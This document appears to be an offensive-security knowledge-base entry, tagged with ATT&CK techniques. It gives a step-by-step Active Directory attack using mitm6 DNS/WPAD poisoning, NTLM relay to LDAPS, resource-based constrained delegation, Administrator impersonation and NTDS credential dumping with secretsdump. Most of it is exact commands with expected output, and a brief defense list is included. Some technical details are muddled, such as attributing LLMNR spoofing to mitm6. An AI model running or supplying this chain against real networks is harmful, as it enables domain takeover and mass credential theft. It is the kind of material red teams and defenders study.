---
id: 3ee7dc2f-2eee-4075-b2a7-ff4751f2081f
name: DNS Poisoning and Credential Dumping via mitm6 Relay Attack
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:05.649147+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - '[[techniques/Adversary-in-the-Middle|T1557 - Adversary-in-the-Middle]]'
  - '[[techniques/OS Credential Dumping|T1003 - OS Credential Dumping]]'
  - '[[techniques/Account Manipulation|T1098 - Account Manipulation]]'
sub_techniques:
  - >-
    [[sub-techniques/LLMNR/NBT-NS Poisoning and Relay|T1557.001 - LLMNR/NBT-NS
    Poisoning and Relay]]
  - '[[sub-techniques/NTDS|T1003.002 - NTDS]]'
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/DNS Poisoning]]'
  - '[[tags/NTLM Relay]]'
  - '[[tags/RBCD]]'
  - '[[tags/Man-in-the-Middle]]'
commands:
  - '[[commands/clone-and-install-mitm6]]'
  - '[[commands/mitm6-dns-poisoning]]'
  - '[[commands/ntlmrelayx-relay-to-ldaps]]'
  - '[[commands/ntlmrelayx-add-computer]]'
  - '[[commands/ntlmrelayx-grant-delegation]]'
  - '[[commands/getst-impersonate-admin]]'
  - '[[commands/set-krb5ccname-and-secretsdump]]'
platforms:
  - Linux
  - Windows
  - Active Directory
tools:
  - '[[tools/mitm6]]'
  - '[[tools/Impacket]]'
validated: true
---

# DNS Poisoning and Credential Dumping via mitm6 Relay Attack

## Summary

This procedure demonstrates how to perform DNS poisoning using mitm6 to manipulate WPAD and LLMNR/NBT-NS resolutions on a target network, followed by an NTLM relay attack with ntlmrelayx to capture and relay authentication attempts. The relayed credentials enable resource-based constrained delegation (RBCD) for persistence, impersonation of domain admins, and eventual dumping of domain credentials from the Active Directory database using Kerberos tickets.

## Description

In an Active Directory environment, clients rely on WPAD for proxy configuration and LLMNR/NBT-NS for name resolution fallbacks. By spoofing these protocols, mitm6 poisons the DNS cache, directing clients to an attacker-controlled server. When users authenticate to this server (e.g., via file shares), ntlmrelayx intercepts NTLM authentication and relays it to a domain controller over LDAPS, adding the attacker's machine as a computer account and granting delegation rights. This allows impersonation of high-privilege accounts to request service tickets and dump hashes from the NTDS.dit using tools like secretsdump.py. This technique is effective in networks without SMB signing or EP/EPP enforcement, leading to full domain compromise.

## Requirements

1. Attacker machine on the same local network segment as target clients and domain controller (Layer 2 access required for poisoning).
2. Python 3 environment with pip for installing mitm6 and Impacket.
3. Valid domain name (e.g., lab.local) and domain controller FQDN/IP.
4. No SMB signing enforced on clients or servers; LDAPS port (636) open to DC.
5. Administrative privileges on attacker machine for network interface binding.

## Defense

- Enable SMB signing and require it for all communications to prevent relay.
- Implement DNSSEC and monitor for anomalous DNS responses or rogue name servers.
- Deploy Endpoint Privilege Management (EPM) to block unsigned WPAD files.
- Monitor for unexpected computer account creations and delegation changes in AD.
- Use Kerberos Armoring (FAST) and disable NTLM where possible.
- Network segmentation to isolate clients from potential attacker positions.

## Objectives

1. Poison DNS/WPAD to redirect client authentications to attacker.
2. Relay NTLM auth to DC for machine account creation and RBCD setup.
3. Impersonate domain admin to obtain Kerberos tickets.
4. Dump all domain credentials from NTDS for further lateral movement.

## Instructions

### Step 1: Install mitm6

**Context**: Clone and install mitm6 from its GitHub repository to enable DNS poisoning capabilities. This sets up the tool for intercepting and spoofing WPAD/LLMNR requests.

**Command** ([[commands/clone-and-install-mitm6]]):
```bash
git clone https://github.com/fox-it/mitm6.git
cd mitm6
pip install .
```

> This command clones the repository, navigates to the directory, and installs dependencies. Run as root or with sufficient privileges.

**Expected Output**: Successful pip installation messages, no errors in dependency resolution.

### Step 2: Run mitm6 for DNS Poisoning

**Context**: Launch mitm6 to listen on the network interface, whitelist target hosts, and poison DNS for the specified domain by responding to WPAD and LLMNR queries.

**Command** ([[commands/mitm6-dns-poisoning]]):
```bash
mitm6 -hw $_HOST_WHITELIST -d $_DOMAIN --ignore-nofqdn
```

> Replace $_HOST_WHITELIST with target hostnames (e.g., ws02) and $_DOMAIN with the AD domain (e.g., lab.local). The --ignore-nofqdn flag processes non-FQDN requests. Keep this running in one terminal.

**Expected Output**: Logs showing poisoned requests, e.g., "WPAD protocol triggered for host X" and successful spoofing of name resolutions.

### Step 3: Relay NTLM to LDAPS

**Context**: Start ntlmrelayx to listen for incoming NTLM auth from poisoned clients and relay them to the domain controller over LDAPS, capturing NetNTLM hashes if possible.

**Command** ([[commands/ntlmrelayx-relay-to-ldaps]]):
```bash
ntlmrelayx.py -ip $_ATTACKER_IP -t ldaps://$_DC_FQDN -wh $_WPAD_HOST
```

> Use $_ATTACKER_IP (e.g., 10.10.10.10), $_DC_FQDN (e.g., dc01.lab.local), and $_WPAD_HOST (e.g., attacker-wpad). This relays auth attempts to gain initial access.

**Expected Output**: Relay logs indicating successful authentication relay, potentially captured hashes or delegated access.

### Step 4: Add Computer Account via Relay

**Context**: Extend the relay to automatically add the attacker's forged computer account to the domain during relay, enabling further actions like delegation.

**Command** ([[commands/ntlmrelayx-add-computer]]):
```bash
ntlmrelayx.py -ip $_ATTACKER_IP -t ldaps://$_DC_FQDN -wh $_WPAD_HOST --add-computer
```

> Same parameters as Step 3, with --add-computer to create a machine account named after the attacker (e.g., GENERATED$).

**Expected Output**: Confirmation of computer account addition in AD, logs showing "Computer account created".

### Step 5: Grant Delegation Rights

**Context**: Use the relay to perform Resource-Based Constrained Delegation (RBCD) by granting the forged account delegation rights on the target.

**Command** ([[commands/ntlmrelayx-grant-delegation]]):
```bash
ntlmrelayx.py -t ldaps://$_DC_FQDN --delegate-access --no-smb-server -wh $_WPAD_HOST
```

> Targets the DC directly for delegation without SMB fallback. Run after account creation.

**Expected Output**: Logs confirming delegation granted, e.g., "RBCD attack successful".

### Step 6: Obtain Service Ticket for Impersonation

**Context**: Use getST.py to request a service ticket impersonating the domain Administrator using the delegated account.

**Command** ([[commands/getst-impersonate-admin]]):
```bash
getST.py -spn cifs/$_TARGET_FQDN $_DOMAIN/$_COMPUTER_ACCOUNT$ -impersonate Administrator
```

> Specify $_TARGET_FQDN (e.g., target.lab.local), $_DOMAIN (e.g., lab.local), $_COMPUTER_ACCOUNT (e.g., GENERATED). Outputs administrator.ccache.

**Expected Output**: Kerberos ticket file (administrator.ccache) generated successfully.

### Step 7: Dump Domain Credentials

**Context**: Set the Kerberos credential cache and use secretsdump.py to extract all domain hashes from the DC using the impersonated ticket.

**Command** ([[commands/set-krb5ccname-and-secretsdump]]):
```bash
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass $_DOMAIN
```

> Points secretsdump to the DC via Kerberos (-k) without password (-no-pass), using the cache for auth.

**Expected Output**: Dumped hashes including NTLM, Kerberos keys, and user accounts from NTDS.dit.
